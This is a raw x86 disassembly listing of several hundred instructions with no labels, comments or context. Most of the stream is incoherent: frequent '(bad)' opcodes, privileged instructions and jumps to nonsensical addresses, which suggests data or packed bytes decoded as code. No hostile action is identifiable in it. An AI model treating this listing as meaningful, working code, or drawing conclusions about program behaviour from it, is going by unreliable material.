  4305c6:	add    esi,DWORD PTR [edi+0x3]
  4305c9:	mov    ecx,DWORD PTR [edi]
  4305cb:	clc    
  4305cc:	rol    ebx,0x4d
  4305cf:	(bad)  
  4305d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4305d7:	mov    ah,0x45
  4305d9:	dec    ebp
  4305da:	jbe    0x43060f
  4305dc:	mov    esi,DWORD PTR [ebx]
  4305de:	call   0x334652e6
  4305e3:	rdpmc  
  4305e5:	rol    DWORD PTR [ebx],0x4d
  4305e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305ee:	inc    ebp
  4305ef:	ror    BYTE PTR [ebx+0x45450808],1
  4305f5:	jmp    0x10b0685
  4305fa:	inc    ebp
  4305fb:	inc    ebp
  4305fc:	(bad)  
  4305fd:	mov    ebx,eax
  4305ff:	clc    
  430600:	test   ebx,eax
  430602:	clc    
  430603:	retf   
  430604:	inc    ebp
  430605:	into   
  430606:	mov    esi,0x8b85afec
  43060c:	clc    
  43060d:	enter  0x5545,0x3b
  430611:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430618:	ret    
  430619:	mov    ah,0xc6
  43061b:	addr16 push 0x338b4545
  430621:	clc    
  430622:	add    eax,ebx
  430624:	loopne 0x4305f1
  430626:	dec    ebp
  430627:	into   
  430628:	mov    al,dh
  43062a:	or     BYTE PTR [edi-0x37ff748e],ch
  430630:	inc    ebp
  430631:	push   ebp
  430632:	mov    ebp,DWORD PTR [ebx]
  430634:	in     al,dx
  430635:	cmp    eax,ebx
  430637:	ja     0x43067e
  430639:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43063f:	inc    ebp
  430640:	call   0xd7c3:0x88f8328b
  430647:	retf   
  430648:	inc    ebp
  430649:	into   
  43064a:	mov    eax,esi
  43064c:	in     al,dx
  43064d:	scas   eax,DWORD PTR es:[edi]
  43064e:	retf   
  43064f:	mov    ecx,DWORD PTR [ebp-0x38]
  430652:	mov    edx,DWORD PTR [ebp-0x24]
  430655:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43065c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430663:	mov    eax,DWORD PTR [ebx]
  430665:	clc    
  430666:	loopne 0x43062b
  430668:	push   ebp
  430669:	retf   
  43066a:	mov    dh,al
  43066c:	adc    esi,ecx
  43066e:	jb     0x43061f
  430670:	add    BYTE PTR [ebx+0x558bc845],cl
  430676:	in     al,dx
  430677:	sub    eax,ebx
  430679:	cmp    ecx,ebx
  43067b:	mov    eax,esi
  43067d:	mov    esp,0x45af03ce
  430682:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430688:	mov    eax,ebx
  43068a:	in     al,dx
  43068b:	into   
  43068c:	dec    ebp
  43068d:	(bad)  
  43068e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430694:	rol    DWORD PTR [ebp+0x4d],0x89
  430698:	xor    esp,esp
  43069a:	sub    eax,DWORD PTR [ebp-0x75]
  43069d:	add    ebp,esp
  43069f:	mov    al,0x55
  4306a1:	inc    ebp
  4306a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4306a8:	retf   0x55dc
  4306ab:	inc    ebp
  4306ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4306af:	pushf  
  4306b0:	(bad)  
  4306b1:	(bad)  
  4306b2:	adc    eax,eax
  4306b4:	jb     0x43063b
  4306b6:	add    al,bh
  4306b8:	enter  0x8645,0x33
  4306bc:	inc    DWORD PTR [ebx]
  4306be:	(bad)  
  4306bf:	jmp    0x430706
  4306c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4306c7:	inc    ebp
  4306c8:	(bad)  
  4306c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4306cf:	call   0xb4d:0x88c132cb
  4306d6:	lea    eax,[ebp+0x8]
  4306d9:	xor    esi,DWORD PTR [edx+0x3]
  4306dc:	add    al,ah
  4306de:	inc    ebp
  4306df:	dec    ebp
  4306e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306e6:	data16 add ch,cl
  4306e9:	inc    ebp
  4306ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306f0:	inc    ebp
  4306f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306f7:	push   ebp
  4306f8:	(bad)  
  4306f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4306ff:	add    ch,ch
  430701:	inc    ebp
  430702:	dec    DWORD PTR [ebx-0x34332775]
  430708:	add    al,0x4d
  43070a:	inc    ebp
  43070b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430711:	call   0xc000:0x8b003201
  430718:	add    BYTE PTR [ebp-0x1],cl
  43071b:	xor    ecx,esp
  43071d:	xor    eax,DWORD PTR [eax]
  43071f:	add    edx,DWORD PTR [eax+0x3]
  430722:	mov    DWORD PTR [edi],ecx
  430724:	call   0x4288c7ea
  430729:	mov    DWORD PTR [ebp-0x20],esp
  43072c:	add    BYTE PTR [ebp+0x7d],al
  43072f:	mov    eax,DWORD PTR [eax]
  430731:	in     al,0x15
  430733:	ret    
  430734:	iret   
  430735:	(bad)  
  430736:	enter  0x14af,0x8b
  43073a:	(bad)  
  43073b:	in     al,dx
  43073c:	or     bl,cl
  43073e:	adc    cl,al
  430740:	push   ebp
  430741:	dec    ebp
  430742:	inc    eax
  430743:	mov    edx,DWORD PTR [ebp-0x20]
  430746:	jb     0x430713
  430748:	mov    ecx,esi
  43074a:	cld    
  43074b:	scas   eax,DWORD PTR es:[edi]
  43074c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430753:	mov    BYTE PTR [eax],0x8c
  430756:	push   0xffffff9a
  430758:	push   edi
  430759:	xor    dl,BYTE PTR [eax+0x3b]
  43075c:	mov    ecx,DWORD PTR [edi]
  43075e:	call   0x8c424cc1
  430763:	mov    eax,eax
  430765:	in     al,dx
  430766:	jge    0x4307b5
  430768:	mov    DWORD PTR [ebx],esi
  43076a:	int3   
  43076b:	add    eax,DWORD PTR [ebp+0xf]
  43076e:	xor    eax,ecx
  430770:	(bad)  
  430771:	dec    ebp
  430772:	pushf  
  430773:	xor    ecx,esp
  430775:	add    edi,DWORD PTR [edi]
  430777:	mov    eax,DWORD PTR [ebp-0x38]
  43077a:	aam    0x84
  43077c:	aam    0x9a
  43077e:	add    esi,DWORD PTR [edx]
  430780:	jmp    0x43070b
  430782:	mov    cl,al
  430784:	add    eax,0x14330f45
  430789:	mov    ecx,0xff458d80
  43078e:	jmp    0xc990175b
  430793:	mov    edx,ecx
  430795:	rol    BYTE PTR [ebp+0x330155],1
  43079b:	add    ecx,DWORD PTR [ebp+0xf]
  43079e:	xor    eax,edx
  4307a0:	(bad)  
  4307a1:	ror    DWORD PTR [eax],0x86
  4307a4:	jb     0x4307a3
  4307a6:	add    bh,bh
  4307a8:	clc    
  4307a9:	inc    ebp
  4307aa:	jb     0x430816
  4307ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4307b2:	xor    eax,0xc7d89c8b
  4307b7:	add    al,al
  4307b9:	push   0xf830c3
  4307be:	inc    ebp
  4307bf:	jne    0x4307f6
  4307c1:	push   0xffffff9c
  4307c3:	inc    edi
  4307c5:	adc    al,0xe8
  4307c7:	inc    ebp
  4307c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4307ce:	mov    ecx,DWORD PTR [eax]
  4307d0:	cld    
  4307d1:	or     DWORD PTR [ebp-0x34],0x33
  4307d5:	jbe    0x4307da
  4307d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4307da:	dec    ebp
  4307db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307e1:	mov    BYTE PTR [ebx],dh
  4307e3:	mov    eax,DWORD PTR [ebx]
  4307e5:	or     BYTE PTR [ecx+0x3b],dl
  4307e8:	dec    ebp
  4307e9:	int3   
  4307ea:	xor    ebp,edi
  4307ec:	add    eax,DWORD PTR [ebp+0x51]
  4307ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4307f2:	xor    eax,DWORD PTR [eax]
  4307f4:	add    ebp,DWORD PTR [eax+0x51]
  4307f7:	adc    BYTE PTR [eax+0x0],0x8b
  4307fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430801:	inc    ebp
  430802:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430808:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43080e:	dec    ebp
  43080f:	mov    esi,DWORD PTR [ebx]
  430811:	hlt    
  430812:	add    eax,ebx
  430814:	push   ecx
  430815:	inc    ebp
  430816:	dec    ebp
  430817:	aam    0xff
  430819:	aam    0xe4
  43081b:	(bad)  
  43081c:	retf   
  43081d:	mov    al,ds:0xc1ff39ce
  430822:	adc    al,0xc6
  430824:	inc    ebp
  430825:	and    eax,0x9c0f4c85
  43082a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430831:	cmp    BYTE PTR [ebx+0x39],0x0
  430835:	mov    dh,0xc7
  430837:	cmp    eax,eax
  430839:	jne    0x45440085
  43083f:	mov    edi,DWORD PTR [ebx]
  430841:	mov    eax,0x848bcb9c
  430846:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43084d:	or     BYTE PTR [edi],cl
  43084f:	(bad)  
  430850:	dec    ebp
  430851:	inc    edi
  430852:	add    bh,0x53
  430855:	or     cl,ch
  430857:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43085d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430863:	mov    esp,0xf802b588
  430868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430869:	inc    ebp
  43086a:	(bad)  
  43086b:	cmp    edi,edi
  43086d:	pushf  
  43086e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430875:	mov    ecx,DWORD PTR [ebp-0x340018]
  43087b:	into   
  43087c:	dec    DWORD PTR [ebx-0x7f72431c]
  430882:	push   0x5000ff01
  430887:	retf   
  430888:	inc    ebp
  430889:	into   
  43088a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430890:	push   eax
  430891:	into   
  430892:	call   0x4b0d22
  430897:	retf   
  430898:	add    dh,cl
  43089a:	add    bh,bh
  43089c:	mov    DWORD PTR [eax+ecx*1],edx
  43089f:	clc    
  4308a0:	inc    ebp
  4308a1:	inc    ebp
  4308a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4308a8:	push   0x1
  4308aa:	push   edi
  4308ab:	add    BYTE PTR [eax-0x35],dl
  4308ae:	mov    ecx,esi
  4308b0:	cld    
  4308b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4308b7:	into   
  4308b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4308bf:	xor    eax,DWORD PTR [ebp+0x3]
  4308c2:	jne    0x430915
  4308c4:	call   DWORD PTR [eax-0x3c]
  4308c7:	mov    DWORD PTR [ecx-0x18],edx
  4308ca:	mov    edi,edi
  4308cc:	call   0x8b464e55
  4308d1:	add    ah,ah
  4308d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4308d7:	add    edi,edi
  4308d9:	add    al,ch
  4308db:	inc    ebp
  4308dc:	push   ecx
  4308dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4308e3:	mov    al,0xc7
  4308e5:	test   esp,esp
  4308e7:	clc    
  4308e8:	test   DWORD PTR [ebp-0x8],ecx
  4308eb:	add    BYTE PTR [ebp+0x53],0x34
  4308ef:	jmp    0x8bcc9190
  4308f4:	in     al,dx
  4308f5:	or     BYTE PTR [ebp-0xf],al
  4308f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4308fe:	hlt    
  4308ff:	mov    eax,DWORD PTR [ebp-0x50]
  430902:	xor    esi,ecx
  430904:	add    eax,DWORD PTR [eax+0x4f086689]
  43090a:	inc    ebp
  43090b:	adc    ebp,0x68
  43090e:	pushf  
  43090f:	inc    edi
  430911:	add    al,ch
  430913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430914:	test   edi,edi
  430916:	clc    
  430917:	inc    DWORD PTR [ebp-0x73]
  43091a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43091e:	(bad)  
  43091f:	push   ecx
  430920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430921:	jne    0x4308a8
  430923:	push   eax
  430924:	clc    
  430925:	test   DWORD PTR [ebp-0x1],eax
  430928:	cmp    bh,bh
  43092a:	pushf  
  43092b:	mov    eax,edi
  43092d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430934:	inc    ebp
  430935:	push   edi
  430936:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43093e:	dec    ebp
  43093f:	add    BYTE PTR [ebx],dh
  430941:	inc    ebp
  430942:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430948:	enter  0x8401,0x0
  43094c:	add    al,BYTE PTR [eax]
  43094e:	add    bh,bh
  430950:	out    dx,eax
  430951:	sbb    BYTE PTR [eax],al
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43095a:	sub    esi,DWORD PTR [ebx]
  43095c:	mov    ebp,DWORD PTR [eax-0x8]
  43095f:	add    bl,0x0
  430962:	(bad)  
  430963:	cmp    eax,ecx
  430965:	or     BYTE PTR [edx+0x750114],al
  43096b:	inc    DWORD PTR [ebp+0x18]
  43096e:	mov    eax,DWORD PTR [ebp-0x8]
  430971:	mov    ebx,eax
  430973:	(bad)  
  430974:	retf   
  430975:	inc    ebp
  430976:	into   
  430977:	mov    esi,eax
  430979:	int3   
  43097a:	scas   eax,DWORD PTR es:[edi]
  43097b:	push   es
  43097c:	mov    esi,DWORD PTR [ebp-0xc]
  43097f:	call   DWORD PTR [ebp+0x18]
  430982:	sub    edi,DWORD PTR [ebp+0x3b]
  430985:	mov    esi,DWORD PTR [edi-0x34]
  430988:	mov    eax,DWORD PTR [ebp-0x8]
  43098b:	xor    eax,0xc7c69cc3
  430990:	mov    esp,0x8b8500dc
  430995:	clc    
  430996:	mov    esp,0x338b4d45
  43099b:	in     al,0x33
  43099d:	ret    
  43099e:	add    eax,esi
  4309a0:	add    eax,DWORD PTR [ebp+0xf]
  4309a3:	mov    eax,ecx
  4309a5:	in     al,0x4d
  4309a7:	ret    
  4309a8:	mov    eax,esi
  4309aa:	in     al,dx
  4309ab:	inc    ebp
  4309ac:	rol    edi,1
  4309ae:	sar    al,1
  4309b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4309b6:	add    BYTE PTR [ebx],bh
  4309b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4309bf:	test   ebx,eax
  4309c1:	clc    
  4309c2:	retf   
  4309c3:	inc    ebp
  4309c4:	into   
  4309c5:	cmp    esi,eax
  4309c7:	pushf  
  4309c8:	scas   eax,DWORD PTR es:[edi]
  4309c9:	(bad)  
  4309ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4309d1:	inc    ebp
  4309d2:	cmp    edi,DWORD PTR [edi]
  4309d4:	ja     0x430972
  4309d6:	mov    eax,edi
  4309d8:	mov    esp,0x458567a8
  4309dd:	clc    
  4309de:	mov    eax,DWORD PTR [ebp-0x8]
  4309e1:	mov    eax,ebx
  4309e3:	in     al,dx
  4309e4:	retf   
  4309e5:	ret    
  4309e6:	into   
  4309e7:	mov    dh,0x7d
  4309ea:	scas   eax,DWORD PTR es:[edi]
  4309eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309f1:	add    BYTE PTR [ebx],ch
  4309f3:	jmp    0xba0b33
  4309f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4309fb:	mov    eax,DWORD PTR [ebp-0x14]
  4309fe:	inc    ebp
  4309ff:	enter  0x458b,0xf8
  430a03:	xor    eax,ebx
  430a05:	add    ecx,ebx
  430a07:	cmp    ecx,esi
  430a09:	shufps xmm7,xmm4,0xaf
  430a0d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430a13:	dec    ebp
  430a14:	sub    esi,DWORD PTR [ebx]
  430a16:	cmp    esi,DWORD PTR [ebx]
  430a18:	ja     0x430a1d
  430a1a:	mov    eax,DWORD PTR [ebx]
  430a1c:	lods   al,BYTE PTR ds:[esi]
  430a1d:	mov    db0,ecx
  430a20:	inc    ebp
  430a21:	dec    ebp
  430a22:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430a28:	retf   
  430a29:	rol    dh,1
  430a2b:	or     al,0xce
  430a2d:	inc    ebp
  430a2e:	scas   eax,DWORD PTR es:[edi]
  430a2f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430a35:	add    BYTE PTR [ebx],ch
  430a37:	add    BYTE PTR [ebx],bh
  430a39:	inc    ebp
  430a3a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a40:	inc    ebp
  430a41:	retf   
  430a42:	mov    ecx,esi
  430a44:	clc    
  430a45:	(bad)  
  430a46:	retf   
  430a47:	scas   eax,DWORD PTR es:[edi]
  430a48:	ret    
  430a49:	mov    ecx,esi
  430a4b:	hlt    
  430a4c:	(bad)  
  430a4d:	push   ebp
  430a4e:	scas   eax,DWORD PTR es:[edi]
  430a4f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a55:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a5b:	add    BYTE PTR [ebx],al
  430a5d:	mov    eax,eax
  430a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a60:	inc    ebp
  430a61:	dec    ebp
  430a62:	xor    eax,0x89339c33
  430a67:	add    edx,eax
  430a69:	add    eax,DWORD PTR [ebp+0xf]
  430a6c:	xor    al,0xc1
  430a6e:	pushf  
  430a6f:	dec    ebp
  430a70:	(bad)  
  430a71:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430a77:	rol    BYTE PTR [ebp+0x5],1
  430a7a:	xor    eax,DWORD PTR [ebp+0x3]
  430a7d:	jmp    0x430a6a
  430a7f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a85:	xor    eax,DWORD PTR [ebp+0x33]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	rol    BYTE PTR [ebx],1
  430a8c:	test   BYTE PTR [edi],cl
  430a8e:	call   0xb8b:0x884d32c1
  430a95:	in     al,dx
  430a96:	inc    ebp
  430a97:	shl    DWORD PTR [ebx],1
  430a99:	rol    BYTE PTR [ebx],1
  430a9b:	add    eax,0xeb4d45e0
  430aa0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430aa6:	add    BYTE PTR [ebx],dh
  430aa8:	inc    ebp
  430aa9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430aaf:	rdpmc  
  430ab1:	rol    DWORD PTR [ebx],0x4d
  430ab4:	loopne 0x430a41
  430ab6:	push   ebp
  430ab7:	in     al,dx
  430ab8:	mov    cl,dl
  430aba:	adc    eax,edx
  430abc:	jb     0x430ac3
  430abe:	add    BYTE PTR [ebp+0x45],al
  430ac1:	jmp    0x430a4e
  430ac3:	mov    ebx,eax
  430ac5:	test   al,0xcb
  430ac7:	dec    ebp
  430ac8:	dec    ebp
  430ac9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430acf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  430ad5:	dec    ebp
  430ad6:	mov    al,0x8b
  430ad8:	dec    ebp
  430ad9:	in     al,dx
  430ada:	xor    edx,ecx
  430adc:	xor    edx,eax
  430ade:	add    eax,DWORD PTR [ebp+0x3]
  430ae1:	jbe    0x430af2
  430ae3:	mov    eax,ecx
  430ae5:	test   al,0x45
  430ae7:	dec    ebp
  430ae8:	mov    DWORD PTR [ebx],esi
  430aea:	loopne 0x430b1f
  430aec:	inc    ebp
  430aed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430af3:	rol    esi,0x45
  430af6:	scas   eax,DWORD PTR es:[edi]
  430af7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430afd:	mov    eax,ecx
  430aff:	hlt    
  430b00:	dec    ebp
  430b01:	inc    ebp
  430b02:	mov    eax,edi
  430b04:	loopne 0x430ade
  430b06:	retf   
  430b07:	test   esi,ecx
  430b09:	clc    
  430b0a:	scas   eax,DWORD PTR es:[edi]
  430b0b:	inc    ebp
  430b0c:	mov    eax,edi
  430b0e:	fdiv   st,st(0)
  430b10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430b16:	call   0xf8b:0x3b9c323b
  430b1d:	fcomp  DWORD PTR [esi-0x3d]
  430b20:	inc    esi
  430b22:	mov    ebp,DWORD PTR [eax-0x10]
  430b25:	inc    ebp
  430b26:	dec    ebp
  430b27:	xor    esi,DWORD PTR [ebx]
  430b29:	add    eax,DWORD PTR [ebx]
  430b2b:	loopne 0x430b3c
  430b2d:	dec    ebp
  430b2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430b35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430b3b:	lock call 0xf48b:0x894532c3
  430b43:	rol    BYTE PTR [ebp-0x7c],1
  430b46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430b4c:	call   edi
  430b4e:	enter  0x4d45,0x8b
  430b52:	mov    esi,eax
  430b54:	fmul   st(3),st
  430b56:	push   ebp
  430b57:	dec    ebp
  430b58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b5e:	ret    0xc19a
  430b61:	xor    al,BYTE PTR [esi-0x280276]
  430b67:	dec    ebp
  430b68:	jne    0x430b9d
  430b6a:	mov    eax,DWORD PTR [ebx]
  430b6c:	cld    
  430b6d:	loopne 0x430b1f
  430b6f:	push   ebp
  430b70:	add    DWORD PTR [eax+0x72851100],ecx
  430b76:	inc    DWORD PTR [eax]
  430b78:	inc    DWORD PTR [ebp-0x75]
  430b7b:	mov    edi,esp
  430b7d:	lock add bl,0x1
  430b81:	retf   
  430b82:	add    dh,al
  430b84:	xor    dh,cl
  430b86:	inc    ebp
  430b87:	scas   eax,DWORD PTR es:[edi]
  430b88:	mov    eax,DWORD PTR [ebx]
  430b8a:	shl    al,0x0
  430b8d:	inc    ebp
  430b8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b94:	call   0x461dcc
  430b99:	ud0    eax,ecx
  430b9c:	adc    al,0x4d
  430b9e:	inc    ebp
  430b9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430ba5:	lock push 0x338055
  430bab:	add    eax,DWORD PTR [eax]
  430bad:	ud0    ecx,edx
  430bb0:	sbb    BYTE PTR [ebp+0x5e],dl
  430bb3:	xor    ecx,ecx
  430bb5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430bbc:	push   ecx
  430bbd:	add    BYTE PTR [ebp-0x38],cl
  430bc0:	mov    DWORD PTR [esi-0x740004],eax
  430bc6:	cld    
  430bc7:	inc    ebp
  430bc8:	xchg   ebx,eax
  430bc9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430bcf:	xabort 0xaf
  430bd2:	icebp  
  430bd3:	mov    esi,DWORD PTR [ebp-0x28]
  430bd6:	(bad)  
  430bd7:	retf   
  430bd8:	or     ecx,eax
  430bda:	(bad)  
  430bdb:	dec    ebp
  430bdc:	pop    es
  430bdd:	(bad)  
  430bde:	(bad)  
  430bdf:	or     BYTE PTR [esi],al
  430be1:	jb     0x430ba9
  430be3:	add    BYTE PTR [ebx],al
  430be5:	inc    ebp
  430be6:	(bad)  
  430be7:	mov    ecx,DWORD PTR [edx]
  430be9:	fadd   st(6),st
  430beb:	ret    
  430bec:	add    ah,BYTE PTR [esi-0x37]
  430bef:	int    0x55
  430bf1:	sub    ebp,esp
  430bf3:	add    edx,DWORD PTR [ecx-0x14]
  430bf6:	inc    ebp
  430bf7:	inc    ebp
  430bf8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bfe:	cld    
  430bff:	(bad)  
  430c00:	(bad)  
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	loopne 0x430c3f
  430c04:	mov    DWORD PTR [edi],ecx
  430c06:	mov    ebp,ebp
  430c08:	clc    
  430c09:	push   eax
  430c0b:	push   DWORD PTR [ebp-0x4]
  430c0e:	mov    BYTE PTR [ebp+0xa],0xff
  430c12:	(bad)  
  430c13:	int3   
  430c14:	or     BYTE PTR [eax],al
  430c16:	(bad)  
  430c17:	lea    eax,[edi]
  430c19:	ins    BYTE PTR es:[edi],dx
  430c1a:	(bad)  
  430c1b:	inc    DWORD PTR [ecx]
  430c1d:	push   eax
  430c1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430c22:	leave  
  430c23:	les    edx,FWORD PTR [ebp+0x0]
  430c26:	in     al,dx
  430c27:	call   DWORD PTR [ecx-0x75]
  430c2a:	inc    ebp
  430c2b:	cld    
  430c2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430c32:	cld    
  430c33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430c39:	sti    
  430c3a:	mov    eax,DWORD PTR [eax]
  430c3c:	clc    
  430c3d:	test   eax,esi
  430c3f:	je     0x430cb6
  430c41:	mov    eax,esi
  430c43:	cld    
  430c44:	add    al,0x80
  430c46:	add    WORD PTR [ecx+0x0],ax
  430c4a:	fadd   DWORD PTR [eax]
  430c4c:	mov    BYTE PTR [eax],0xd4
  430c4f:	push   0xffffffc3
  430c51:	push   edi
  430c52:	mov    edx,DWORD PTR [eax+0x51]
  430c55:	pop    edi
  430c56:	lea    ebx,[ebx-0x8]
  430c59:	ret    0x45
  430c5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c62:	xchg   eax,edi
  430c64:	mov    DWORD PTR [ebp-0x75],ecx
  430c67:	push   esi
  430c68:	clc    
  430c69:	jne    0x430c3b
  430c6b:	mov    ecx,0xf8450b0b
  430c70:	(bad)  
  430c71:	push   cs
  430c72:	or     BYTE PTR [ebp-0x3a],dh
  430c75:	cmp    eax,DWORD PTR [ecx]
  430c77:	pop    esi
  430c78:	(bad)  
  430c79:	or     al,0x5
  430c7b:	inc    eax
  430c7c:	leave  
  430c7d:	call   0x21994e86
  430c82:	iret   
  430c83:	inc    eax
  430c84:	leave  
  430c85:	jmp    0xd8ce4d89
  430c8a:	mov    eax,DWORD PTR [edx-0x3a]
  430c8d:	jl     0x430c83
  430c8f:	inc    eax
  430c90:	nop
  430c91:	loop   0x430c92
  430c93:	ret    
  430c94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c9a:	add    eax,0xff45e8f8
  430c9f:	push   esi
  430ca0:	push   DWORD PTR [ebp-0x39]
  430ca3:	mov    eax,0x7e9da46
  430ca8:	or     al,0x6
  430caa:	push   DWORD PTR [ebp-0x3a]
  430cad:	cmp    eax,DWORD PTR [edx]
  430caf:	pop    esi
  430cb0:	ret    
  430cb1:	or     al,0x56
  430cb3:	inc    ecx
  430cb4:	push   ebp
  430cb5:	jl     0x430ca3
  430cb7:	inc    edx
  430cb8:	inc    ebp
  430cb9:	leave  
  430cba:	add    DWORD PTR [ecx+0x28],eax
  430cbd:	and    esp,edi
  430cbf:	inc    ecx
  430cc0:	jne    0x430ca9
  430cc2:	add    DWORD PTR [edx+0x1c],eax
  430cc5:	enter  0xc38b,0x14
  430cc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430ccf:	clc    
  430cd0:	enter  0xd345,0x56
  430cd4:	div    DWORD PTR [ebp+0x50]
  430cd7:	mov    eax,0x7c80ece
  430cdc:	rol    DWORD PTR [esi],cl
  430cde:	div    DWORD PTR [ebp+0x50]
  430ce1:	cmp    ecx,edx
  430ce3:	pop    esi
  430ce4:	dec    BYTE PTR [edx]
  430ce6:	in     al,dx
  430ce7:	inc    edx
  430ce8:	sub    ebp,ebp
  430cea:	inc    eax
  430ceb:	(bad)  
  430cec:	push   eax
  430ced:	add    edx,DWORD PTR [eax-0x13]
  430cf0:	push   edi
  430cf1:	add    dh,dh
  430cf3:	leave  
  430cf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cf8:	add    BYTE PTR [ecx+0x0],dl
  430cfb:	inc    ebp
  430cfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d02:	add    BYTE PTR [eax-0x7fbf448],bh
  430d08:	add    al,0x2
  430d0a:	jmp    0x57eb864
  430d0f:	jne    0x430cf9
  430d11:	mov    eax,DWORD PTR [edx]
  430d13:	or     BYTE PTR [eax],al
  430d15:	inc    ecx
  430d16:	stc    
  430d17:	jmp    0xe7824d52
  430d1c:	jge    0x430d5f
  430d1e:	mov    esi,ebp
  430d20:	lock ret 0x7d
  430d24:	and    ecx,DWORD PTR [ebx-0x171777]
  430d2a:	add    bh,bh
  430d2c:	aad    0xd7
  430d2e:	add    dh,cl
  430d30:	clts   
  430d32:	(bad)  
  430d33:	call   0xffce0c38
  430d38:	hlt    
  430d39:	iret   
  430d3a:	jge    0x430d12
  430d3c:	rol    DWORD PTR [esi-0x80],cl
  430d3f:	cmc    
  430d40:	or     BYTE PTR [edi-0x27],cl
  430d43:	(bad)  
  430d44:	out    dx,al
  430d45:	mov    eax,DWORD PTR [ebx]
  430d47:	(bad)  
  430d48:	pop    esi
  430d49:	push   es
  430d4a:	cmp    al,0xe8
  430d4c:	sar    edi,0x8
  430d4f:	inc    DWORD PTR [edi]
  430d51:	inc    esi
  430d52:	(bad)  
  430d53:	loop   0x430dd3
  430d55:	push   edi
  430d56:	push   cs
  430d57:	push   ebx
  430d58:	add    BYTE PTR [ebx+0x24008b56],cl
  430d5e:	add    BYTE PTR [ebp+0x50],al
  430d61:	push   eax
  430d62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d68:	sub    edx,DWORD PTR [esi-0x24]
  430d6b:	jne    0x430d23
